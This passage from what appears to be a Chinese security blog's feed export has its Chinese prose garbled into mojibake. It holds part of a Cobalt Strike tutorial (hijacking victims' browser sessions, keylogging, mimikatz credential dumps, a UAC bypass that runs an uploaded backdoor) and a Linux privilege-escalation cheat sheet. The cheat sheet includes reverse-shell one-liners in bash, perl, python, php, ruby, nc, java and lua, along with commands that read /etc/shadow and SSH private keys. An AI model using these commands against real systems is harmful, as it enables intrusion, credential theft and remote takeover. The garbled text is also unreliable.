Applicationsæ˜¾ç¤ºå—å®³è€…æœºå™¨çš„åº”ç”¨ä¿¡æ¯ï¼›Credentialsæ˜¾ç¤ºå—å®³è€…æœºå™¨çš„å‡­è¯ä¿¡æ¯ï¼Œèƒ½æ›´æ–¹ä¾¿çš„è¿›è¡Œåç»­æ¸—é€ï¼›Downloads æ–‡ä»¶ä¸‹è½½ï¼›Event Logå¯ä»¥çœ‹åˆ°äº‹ä»¶æ—¥å¿—ï¼Œæ¸…æ¥šçš„çœ‹åˆ°ç³»ç»Ÿçš„äº‹ä»¶,å¹¶ä¸”å›¢é˜Ÿå¯ä»¥åœ¨è¿™é‡ŒèŠå¤©;KeystrokesæŸ¥çœ‹é”®ç›˜è®°å½•ï¼›Proxy PivotsæŸ¥çœ‹ä»£ç†ä¿¡æ¯ï¼›ScreenshotsæŸ¥çœ‹å±å¹•æˆªå›¾ï¼›Script Consoleåœ¨è¿™é‡Œå¯ä»¥åŠ è½½å„ç§è„šæœ¬ä»¥å¢å¼ºåŠŸèƒ½ï¼Œè„šæœ¬åœ°å€æˆ³æˆ‘;TargetsæŸ¥çœ‹ç›®æ ‡ï¼›Web LogæŸ¥çœ‹webæ—¥å¿—ã€‚ è¿˜æœ‰Reportingçš„åŠŸèƒ½å°±ä¸ä»‹ç»äº†ï¼Œä¸»è¦å°±æ˜¯å‡ºæŠ¥å‘Šç”¨çš„ã€‚ 0x05 BeaconBeaconå¯ä»¥é€‰æ‹©é€šè¿‡DNSè¿˜æ˜¯HTTPåè®®å‡ºå£ç½‘ç»œï¼Œä½ ç”šè‡³å¯ä»¥åœ¨ä½¿ç”¨Beaconé€šè®¯è¿‡ç¨‹ä¸­åˆ‡æ¢HTTPå’ŒDNSã€‚å…¶æ”¯æŒå¤šä¸»æœºè¿æ¥ï¼Œéƒ¨ç½²å¥½Beaconåæäº¤ä¸€ä¸ªè¦è¿å›çš„åŸŸåæˆ–ä¸»æœºçš„åˆ—è¡¨ï¼ŒBeaconå°†é€šè¿‡è¿™äº›ä¸»æœºè½®è¯¢ã€‚ç›®æ ‡ç½‘ç»œçš„é˜²æŠ¤å›¢é˜Ÿå¿…é¡»æ‹¦æˆªæ‰€æœ‰çš„åˆ—è¡¨ä¸­çš„ä¸»æœºæ‰å¯ä¸­æ–­å’Œå…¶ç½‘ç»œçš„é€šè®¯ã€‚ é€šè¿‡ç§ç§æ–¹å¼è·å–shellä»¥åï¼ˆæ¯”å¦‚ç›´æ¥è¿è¡Œç”Ÿæˆçš„exeï¼‰ï¼Œå°±å¯ä»¥ä½¿ç”¨beaconäº†ï¼Œå³å‡»ç”µè„‘ï¼ŒInteractï¼Œåˆ™å¯æ‰“å¼€Beacon Console; åœ¨beaconå¤„è¾“å…¥helpï¼Œåˆ™å¯ä»¥çœ‹åˆ°è¯¦ç»†è¯´æ˜ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273beacon&gt; helpBeacon Commands=============== Command Description ------- ----------- browserpivot Setup a browser pivot session bypassuac Spawn a session in a high integrity process cancel Cancel a download that's in-progress cd Change directory checkin Call home and post data clear Clear beacon queue covertvpn Deploy Covert VPN client desktop View and interact with target's desktop dllinject Inject a Reflective DLL into a process download Download a file downloads Lists file downloads in progress drives List drives on target elevate Try to elevate privileges execute Execute a program on target exit Terminate the beacon session getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process jobkill Kill a long-running post-exploitation task jobs List long-running post-exploitation tasks kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Inject a keystroke logger into a process kill Kill a process link Connect to a Beacon peer over SMB logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode http Use HTTP as data channel mode smb Use SMB peer-to-peer communication net Network and host enumeration tool note Assign a note to this Beacon portscan Scan a network for open services powershell Execute a command via powershell powershell-import Import a powershell script ps Show process list psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host pth Pass-the-hash using Mimikatz pwd Print current directory rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward runas Execute a program as another user screenshot Take a screenshot shell Execute a command via cmd.exe sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file wdigest Dump plaintext credentials with mimikatz winrm Use WinRM to spawn a session on a host wmi Use WMI to spawn a session on a host å¯¹äºæŸä¸ªæ¨¡å—çš„ä½¿ç”¨æ–¹å¼å¯ä»¥ç›´æ¥ä½¿ç”¨helpæŸ¥çœ‹ï¼Œå¦‚ï¼š12345678910beacon&gt; help browserpivotUse: browserpivot [pid] [x86|x64] browserpivot [stop]Setup a Browser Pivot into the specified process. To hijack authenticatedweb sessions, make sure the process is an Internet Explorer tab. Theseprocesses have iexplore.exe as their parent process.Use "browserpivot stop" to tear down the browser pivoting sessions associated with this Beacon. ä¸‹é¢ä¸»è¦ä»‹ç»å‡ ä¸ªå¥½ç©å„¿çš„åŠŸèƒ½ã€‚è¿™é‡Œä¸ºäº†èƒ½å¿«é€Ÿæ˜¾ç¤ºç»“æœï¼Œå¯ä»¥è®¾ç½®1beacon&gt;sleep 0 0x051 Browserpivotç”¨æˆ·æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹ï¼Œç„¶åå¼€å¯HTTPä»£ç†ï¼Œä¹‹åå°±å¯ä»¥ç™»å½•å—å®³è€…ç™»å½•çš„ç½‘ç«™äº†ã€‚ ä½¿ç”¨æ–¹å¼ï¼Œpsæ‰¾åˆ°æµè§ˆå™¨è¿›ç¨‹ï¼š æ³¨å…¥è¿›ç¨‹ï¼š1beacon&gt; browserpivot 3452 x64 è®¾ç½®æœ¬åœ°æµè§ˆå™¨ä»£ç†ï¼š å½“å—å®³è€…ç™»å½•æŸç½‘ç«™è´¦å·ä»¥åï¼Œé€šè¿‡ä»£ç†ï¼Œæœ¬æœºæµè§ˆå™¨åŒæ ·ç™»å½•è¯¥ç½‘ç«™: å½“ç„¶å½“è¢«æ”»å‡»è€…å…³é—­æµè§ˆå™¨çš„æ—¶å€™ï¼Œä»£ç†ä¹Ÿå°±å¤±æ•ˆäº†ï¼Œå…³é—­æ­¤ä»£ç†å¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š1browserpivot stop 0x052 Sockså¯ä»¥ç›´æ¥å¼€å¯socks4aä»£ç†ï¼Œå¯ä»¥é€šè¿‡ä»£ç†è¿›è¡Œå†…ç½‘æ¸—é€æµ‹è¯•ã€‚å¼€å¯socks1beacon&gt;socks 9999 è¿™é‡Œå¯ä»¥é€‰æ‹©å…¶ä¸­ä¸€å°ï¼Œå³é”®Pivoting-&gt;SOCKS Serverï¼Œåˆ™ä½¿ç”¨æ­¤å°è®¡ç®—æœºå¼€å¯socksä»£ç†ã€‚ é…ç½®proxychains.confï¼Œæ·»åŠ 1socks4 127.0.0.1 9999 ç„¶åå°±å¯ä»¥é€šè¿‡proxychains ä½¿ç”¨å„ç§å·¥å…·åšå†…ç½‘æ¸—é€äº†ã€‚ æˆ–è€…ç›´æ¥å¼€å¯éš§é“ä½¿ç”¨msfï¼Œä¾æ¬¡ç‚¹å‡»View-&gt;Proxy Pivotsï¼Œé€‰æ‹©Socks4a Proxy,ç‚¹å‡»Tunnel: å¤åˆ¶ä»¥åï¼Œåœ¨msfä¸­æ‰§è¡Œï¼Œåˆ™å¯ä»¥å¼€å¯ä»£ç†ï¼š å…³é—­socks1beacon&gt;socks stop 0x053 Screenshot&amp;Keyloggerè¿™é‡Œçš„screenshotå¯ä»¥æˆªå–å—å®³è€…ä¸€å®šæ—¶é—´çš„å±å¹•æˆªå›¾ï¼Œæ“ä½œå‘½ä»¤ä¸ºï¼š1beacon&gt;screenshot [pid] &lt;x86|x64&gt; [run time in seconds] æˆ–è€…1beacon&gt;screenshot ç„¶åæ‰“å¼€View-&gt;Screenshotsï¼Œåˆ™å¯ä»¥çœ‹åˆ°å±å¹•æˆªå›¾ï¼š é”®ç›˜è®°å½•å™¨çš„ä½¿ç”¨æ–¹å¼ä¸ºï¼š1Use: keylogger [pid] &lt;x86|x64&gt; ç„¶åæ‰“å¼€View-&gt;Keystrokesï¼Œåˆ™å¯ä»¥çœ‹åˆ°é”®ç›˜è®°å½•ç»“æœï¼š å¦‚æœä¸æƒ³ä½¿ç”¨å‘½ä»¤è¡Œï¼Œå¯ä»¥ç›´æ¥é€‰æ‹©å—å®³è€…è®¡ç®—æœºï¼ˆå¯å¤šé€‰ï¼‰ï¼Œå³é”®-&gt;Explore-&gt;Process Listï¼š 0x054 powershell-importè¿™ä¸ªåŠŸèƒ½åœ¨åæ¸—é€æµ‹è¯•ä¸­å¾ˆæœ‰ç”¨ï¼Œå¯ä»¥å¯¼å…¥å„ç§powershellæ¸—é€æ¡†æ¶ï¼Œæ¯”å¦‚nishangçš„powerpreterï¼Œç›´æ¥æ‰§è¡Œï¼š1beacon&gt; powershell-import ç„¶ååœ¨æ–‡ä»¶æµè§ˆå™¨é‡Œé¢é€‰æ‹© Powerpreter.psm1ï¼š æˆ–è€…ç›´æ¥æ‰§è¡Œï¼š1powershell-import [/path/to/local/script.ps1] è¿›è¡Œå¯¼å…¥ï¼Œä¹‹åå°±å¯ä»¥ä½¿ç”¨powerpreterçš„å„ç§æ¨¡å—äº†ã€‚ è¦æ‰§è¡ŒæŸæ¨¡å—ç›´æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤,æ¯”å¦‚ï¼š1beacon&gt; powershell Check-VM å…³äºpowerpreterä¹‹å‰åœ¨zoneæœ‰ç®€å•çš„ä»‹ç»ï¼Œpowershellåæ¸—é€æ¡†æ¶ powerpreterã€‚ 0x055 kerberosç›¸å…³è¿™é‡Œä¸€å…±æœ‰ä¸‰ä¸ªæ¨¡å—ï¼Œåˆ†åˆ«æ˜¯ï¼š kerberos_ccache_use :ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ® kerberos_ticket_purge :æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ® kerberos_ticket_useï¼šä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ® è·å–é»„é‡‘ç¥¨æ®çš„æ–¹å¼æ¯”å¦‚ä½¿ç”¨mimikatz:1kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FILE ä¹Œäº‘å…³äºkerberosä¹Ÿæœ‰ç›¸å…³æ–‡ç« ï¼Œæœ‰å…´è¶£çš„å¯ä»¥çœ‹ä¸€ä¸‹ï¼šå†…ç½‘æ¸—é€ä¸­çš„mimikatzåŸŸæ¸—é€çš„é‡‘ä¹‹é’¥åŒ™ æ®è¯´è¿™ä¸ªåœ¨åŸŸæ¸—é€ä¸­å¾ˆæœ‰ç”¨å“Ÿ~ 0x056 BypassUACä»€ä¹ˆï¼Œä½ ä¸èƒ½è¯»å¯†ç ï¼Ÿè¯•è¯•bypassuacå§~ç›´æ¥æ‰§è¡Œ1beacon&gt; bypassuac ä¸‹é¢ä½ å°±å¯ä»¥æ‰§è¡Œé‚£äº›éœ€è¦æœ€é«˜æƒé™çš„æ“ä½œäº†ã€‚ è¿™ä¸€å—åœ¨æµ‹è¯•Win10çš„æ—¶å€™å¹¶æ²¡æœ‰æˆåŠŸï¼Œå…³äºWin10çš„bypassuacæˆ‘åœ¨åšå®¢é‡Œé¢ä¹Ÿæœ‰ç›¸å…³ä»‹ç»ï¼Œè¯¦æƒ…:æˆ³æˆ‘å‘€ åœ¨è¿™é‡Œå°±æ¼”ç¤ºä½¿ç”¨bypassuacçš„powershellè„šæœ¬æ¥è·å–Win10æœ€é«˜æƒé™ï¼Œç”±äºnishangçš„powershellè„šæœ¬ç°åœ¨å¹¶ä¸æ”¯æŒWin10,æ‰€ä»¥è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªæˆ‘ä¿®æ”¹çš„powershellè„šæœ¬ invoke-BypassUAC.ps1 ç”Ÿæˆä¸€ä¸ªbeaconåé—¨ï¼š ä¸Šä¼ åé—¨ï¼š12beacon&gt; cd E:beacon&gt; upload /Users/evi1cg/Desktop/test.exe åŠ è½½powershellæ‰§è¡Œåé—¨ï¼š12beacon&gt; powershell-import /Users/evi1cg/Pentest/Powershell/MyShell/invoke-BypassUAC.ps1beacon&gt; powershell Invoke-BypassUAC -Command 'E:\test.exe' ç„¶åä»–å°±ç ´äº†ï¼š ä½¿ç”¨é‚£ä¸ªç ´äº†çš„ç”µè„‘çš„beaconè¯»å–å¯†ç ï¼š12beacon&gt; sleep 0beacon&gt; wdigest 1beacon&gt; hashdump 0x06 ä¸msfè”åŠ¨cobalt strike3.0 ä¸å†ä½¿ç”¨Metasploitæ¡†æ¶è€Œä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å¹³å°ä½¿ç”¨ï¼Œé‚£ä¹ˆæ€ä¹ˆé€šè¿‡cobalt strikeè·å–åˆ°meterpreterå‘¢ï¼Œåˆ«æ‹…å¿ƒï¼Œå¯ä»¥åšåˆ°çš„ã€‚é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨msfçš„reverse_tcpå¼€å¯ç›‘å¬æ¨¡å¼ï¼š123456789msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpretermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.74.1 lhost =&gt; 192.168.74.1msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit -j ä¹‹åä½¿ç”¨Cobalt Strikeåˆ›å»ºä¸€ä¸ªwindows/foreign/reverse_tcp Listenerï¼š å…¶ä¸­ipä¸ºmsfçš„ipåœ°å€ï¼Œç«¯å£ä¸ºmsfæ‰€ç›‘å¬çš„ç«¯å£ã€‚ç„¶åé€‰ä¸­è®¡ç®—æœºï¼Œå³é”®-&gt;Spawn: é€‰æ‹©åˆšåˆšåˆ›å»ºçš„ç›‘å¬å™¨ï¼š å¯ä»¥çœ‹åˆ°æˆåŠŸè·å–äº†meterpreterå›è¯ï¼š 0x07 å°ç»“æ­¤æ¬¡æµ‹è¯•ä½¿ç”¨windows/beacon_http/reverse_httpæ¥è¿›è¡Œï¼Œå…·ä½“DNSçš„ç›‘å¬å™¨è¯·å‚è€ƒluomæ‰€å†™Cobalt Strike ä¹‹å›¢é˜ŸæœåŠ¡å™¨çš„æ­å»ºä¸DNSé€šè®¯æ¼”ç¤ºï¼Œæœ¬ç¯‡æ–‡ç« åªæ˜¯ä»‹ç»äº†Cobalt Strikeçš„éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¯·å„ä½å¤§ç‰›æŒ‡æ­£ï¼Œå…³äºCobalt Strikeå…¶ä»–çš„åŠŸèƒ½å°ä¼™ä¼´ä»¬å¯ä»¥è‡ªå·±ç ”ç©¶ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼Œæˆ‘ä¹Ÿä¼šå¯¹å…¶è¿›è¡Œè¡¥å……ã€‚å¸Œæœ›å¯¹å„ä½å°ä¼™ä¼´æœ‰ç”¨ã€‚]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobalt strike3.0</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux ææƒå¸¸ç”¨å‘½ä»¤é›†]]></title>
    <url>%2Farchives%2FLinux_Command.html</url>
    <content type="text"><![CDATA[0x00 æ“ä½œç³»ç»Ÿç›¸å…³æ“ä½œç³»ç»Ÿç±»å‹ç‰ˆæœ¬1234cat /etc/issuecat /etc/*-releasecat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat å†…æ ¸ç‰ˆæœ¬ï¼Œæ˜¯å¦æ˜¯64ä½123456cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz- ç¯å¢ƒå˜é‡1234567cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset æŸ¥çœ‹æ˜¯å¦æœ‰æ‰“å°æœº1lpstat -a 0x01 åº”ç”¨ä¸æœåŠ¡ç›¸å…³æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„ç¨‹åºåŠå¯¹åº”çš„ç”¨æˆ·æƒé™1234ps auxps -eftopcat /etc/services ä»¥rootæƒé™è¿è¡Œçš„è¿›ç¨‹12ps aux | grep rootps -ef | grep root æŸ¥çœ‹å®‰è£…äº†çš„åº”ç”¨123456ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesls -alh /var/cache/yum/ ä¸€äº›æœåŠ¡çš„é…ç½®æ–‡ä»¶12345678910cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk '$1 ~ /^.*r.*/' è®¡åˆ’ä»»åŠ¡123456789101112crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root æ‰¾å­˜å‚¨çš„æ˜æ–‡ç”¨æˆ·åï¼Œå¯†ç 1234grep -i user [filename]grep -i pass [filename]grep -C 5 "password" [filename]find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla 0x02 é€šä¿¡ä¸ç½‘ç»œç›¸å…³æŸ¥çœ‹å½“å‰ç½‘ç»œåœ°å€123/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network æŸ¥çœ‹ç½‘ç»œé…ç½®,DNS,DHCP,ç½‘å…³123456cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname æŸ¥çœ‹ç½‘ç»œé€šä¿¡12345678910lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw æŸ¥çœ‹ç¼“å­˜123arp -eroute/sbin/route -nee tcpdump1tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port] äº¤äº’å¼shellbashç‰ˆæœ¬ï¼š1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perlç‰ˆæœ¬:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' pythonç‰ˆæœ¬:1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' phpç‰ˆæœ¬ï¼š1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' rubyç‰ˆæœ¬ï¼š1ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' ncç‰ˆæœ¬ï¼š1nc -e /bin/sh 223.8.200.234 1234 ncä¸ä½¿ç”¨-eï¼š12mknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe mknod:1mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe javaç‰ˆæœ¬ï¼š123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() luaç‰ˆæœ¬ï¼š1lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');" ç«¯å£è½¬å‘ lcx12lcx -listen 4567 33891 #Attackerlcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]12ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe123mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) éš§é“12ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfig 0x03 ç”¨æˆ·ç›¸å…³ç”¨æˆ·ä¿¡æ¯123456789101112idwhowlastcat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;' # åˆ—å‡ºè¶…çº§ç”¨æˆ·awk -F: '($3 == "0") &#123;print&#125;' /etc/passwd #åˆ—å‡ºè¶…çº§ç”¨æˆ·cat /etc/sudoerssudo -l åˆ—å®¶ç›®å½•12ls -ahlR /root/ls -ahlR /home/ ä»é…ç½®æ–‡ä»¶é‡Œé¢å¯»æ‰¾å¯†ç 123cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg çœ‹å…¶ä»–ç”¨æˆ·çš„æ“ä½œè®°å½•12345cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history sshç§é’¥123456789101112131415cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key 0x04 æ–‡ä»¶ç³»ç»Ÿç›¸å…³/etc/ç›®å½•ä¸‹é¢æ–‡ä»¶1234567ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2&gt;/dev/null # Anyonels -aRl /etc/ | awk '$1 ~ /^..w/' 2&gt;/dev/null # Ownerls -aRl /etc/ | awk '$1 ~ /^.....w/' 2&gt;/dev/null # Groupls -aRl /etc/ | awk '$1 ~ /w.$/' 2&gt;/dev/null # Otherfind /etc/ -readable -type f 2&gt;/dev/null # Anyonefind /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone æ—¥å¿—æ–‡ä»¶1234567ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases æŸ¥çœ‹ç½‘ç«™æ–‡ä»¶12345ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/ å¸¸è§æ—¥å¿—æ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/ æ–‡ä»¶æŒ‚è½½123mountdf -hcat /etc/fstab Findå‘½ä»¤12345678find / -perm -1000 -type d 2&gt;/dev/null # åªæœ‰ç›®å½•æ‰€æœ‰è€…æ‰å¯ä»¥æ›´æ”¹åˆ é™¤find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUIDfor i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # ä»ä¸‹é¢å‡ ä¸ªä½ç½®: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin æˆ–è€…å…¶ä»–çš„binç›®å½•å¯»æ‰¾ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null #ä»/ï¼ŒSGUDæˆ–è€…SUIDå¼€å§‹æŸ¥æ‰¾ï¼Œæ’é™¤ç¬¦å·é“¾æ¥ï¼Œæ·±åº¦ä¸º3ä¸ªæ–‡ä»¶å¤¹ï¼Œæ˜¾ç¤ºè¯¦ç»†çš„æ¸…å•å¹¶å»é™¤é”™è¯¯ä¿¡æ¯ å¯»æ‰¾å¯å†™ç›®å½•12345678find / -writable -type d 2&gt;/dev/null # å¯å†™ç›®å½•find / -perm -222 -type d 2&gt;/dev/null # å¯å†™ç›®å½• find / -perm -o w -type d 2&gt;/dev/null # å¯å†™ç›®å½•find / -perm -o x -type d 2&gt;/dev/null # å¯æ‰§è¡Œç›®å½•find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # å¯å†™å¯æ‰§è¡Œç›®å½• æŸ¥æ‰¾æ–‡ä»¶12find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2&gt;/dev/null # å¯å†™æ–‡ä»¶find / dir -xdev \( -nouser -o -nogroup \) -print 2&gt;/dev/null # æ— æ‰€æœ‰è€…æ–‡ä»¶ 0x05 å‡†å¤‡åŠæ”»å‡»æŸ¥çœ‹è¯­è¨€æ”¯æŒ1234find / -name perl*find / -name python*find / -name gcc*find / -name cc æŸ¥çœ‹ä¸Šä¼ æ–¹å¼12345find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp å¯»æ‰¾exphttp://www.exploit-db.comhttp://1337day.comhttp://www.securiteam.comhttp://www.securityfocus.comhttp://www.exploitsearch.nethttp://metasploit.com/modules/http://securityreason.comhttp://seclists.org/fulldisclosure/http://www.google.com ç¼–è¯‘exp12which gccgcc exp.c -o exp è¿è¡Œ12chmod +x exp./exp 0x06 ææƒè¾…åŠ©è„šæœ¬LinEnum linuxprivchecker.py ä»¥ä¸Šå¹¶ä¸å…¨ï¼Œå¯èƒ½ä¼šæœ‰ä»€ä¹ˆé”™è¯¯ï¼Œè¯·å„ä½å¤§å¤§æŒ‡æ­£æˆ–è¡¥å……ã€‚å¤šå¤šå­¦ä¹ äº¤æµã€‚]]></content>
      <categories>
        <category>è¿ç»´</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Powershell Bypass UAC]]></title>
    <url>%2Farchives%2FPowershell_Bypass_UAC.html</url>
